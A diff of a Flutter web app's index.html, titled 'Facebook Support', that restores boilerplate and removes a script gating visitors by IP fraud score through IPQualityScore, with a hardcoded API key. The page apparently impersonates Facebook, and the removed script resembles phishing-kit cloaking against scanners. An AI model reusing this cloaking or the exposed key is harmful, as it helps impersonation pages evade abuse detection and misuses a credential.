@@ -1,67 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <!--
+    If you are serving your web app in a path other than the root, change the
+    href value below to reflect the base path you are serving from.
+
+    The path provided below has to start and end with a slash "/" in order for
+    it to work correctly.
+
+    For more details:
+    * https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base
+
+    This is a placeholder for base href that will be replaced by the value of
+    the `--base-href` argument provided to `flutter build`.
+  -->
   <base href="/">
+
   <meta charset="UTF-8">
   <meta content="IE=Edge" http-equiv="X-UA-Compatible">
   <meta name="description" content="">
+
+  <!-- iOS meta tags & icons -->
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="apple-mobile-web-app-title" content="facebook">
   <link rel="apple-touch-icon" href="icons/Icon-192.png">
+
+  <!-- Favicon -->
   <link rel="icon" type="image/png" href="favicon.png"/>
+
   <title>Facebook Support</title>
   <link rel="manifest" href="manifest.json">
-  <script>const serviceWorkerVersion = "2655113037";</script>
+
+  <script>
+    // The value below is injected by flutter build, do not touch.
+    const serviceWorkerVersion = "2655113037";
+  </script>
+  <!-- This script adds the flutter initialization JS code -->
   <script src="flutter.js" defer></script>
 </head>
 <body>
-<script>
-  async function loadFlutterApp() {
-    const appRunner = await _flutter.loader.loadEntrypoint({
-      serviceWorker: { serviceWorkerVersion }
+  <script>
+    window.addEventListener('load', function(ev) {
+      // Download main.dart.js
+      _flutter.loader.loadEntrypoint({
+        serviceWorker: {
+          serviceWorkerVersion: serviceWorkerVersion,
+        },
+        onEntrypointLoaded: function(engineInitializer) {
+          engineInitializer.initializeEngine().then(function(appRunner) {
+            appRunner.runApp();
+          });
+        }
+      });
     });
-    await appRunner.initializeEngine();
-    appRunner.runApp();
-  }
-
-  async function checkIPWithIPQS() {
-    const IPQS_API_KEY = 'EXAXJnKFgenQIOVmr8wEZykbhI0cvLyF';
-    try {
-      const ipifyRes = await fetch('https://api.ipify.org?format=json');
-      const ipifyData = await ipifyRes.json();
-      const userIp = ipifyData.ip;
-
-      const ipqsUrl = `https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${userIp}?lighter_penalties=true`;
-      const ipqsRes = await fetch(ipqsUrl);
-      const ipqsData = await ipqsRes.json();
-
-      if (!ipqsData.success) {
-        return { allowed: false, reason: 'IPQS API call failed' };
-      }
-
-      const { fraud_score } = ipqsData;
-      if (fraud_score > 70) {
-        return { allowed: false, reason: 'High Fraud Score' };
-      }
-      return { allowed: true };
-    } catch (err) {
-      console.error('Error checking IP with IPQS:', err);
-      return { allowed: false, reason: 'Exception occurred' };
-    }
-  }
-
-  window.addEventListener('load', async function() {
-    const result = await checkIPWithIPQS();
-    if (!result.allowed) {
-      document.body.innerHTML = `
-        <h1>Access Denied</h1>
-        <p>Reason: ${result.reason || 'Unknown'}</p>
-      `;
-    } else {
-      loadFlutterApp();
-    }
-  });
-</script>
+  </script>
 </body>
 </html>
